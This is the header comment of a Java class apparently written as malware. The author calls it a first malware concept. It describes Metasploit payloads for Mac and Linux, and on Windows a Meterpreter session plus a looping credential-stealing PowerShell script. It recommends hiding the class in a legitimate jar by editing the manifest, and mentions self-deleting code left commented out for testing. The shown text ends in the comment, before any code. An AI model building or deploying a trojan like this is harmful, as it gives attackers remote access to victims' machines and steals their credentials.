public class Jetro
/***

(This was my first ever concept attempt at Java malware)

I am not responsible for whatever the fuck you do with this
Mac and Linux have a generic Metasploit payload with no encoders
The Windows payload invokes a Meterpreter session and a looping credsleaker powershell script.
Possible best use for this I could think of is modify a legit jar program's manifest to call this class first then the 'main' one normally

jar.delete(); are commented out so you can test and see payloads
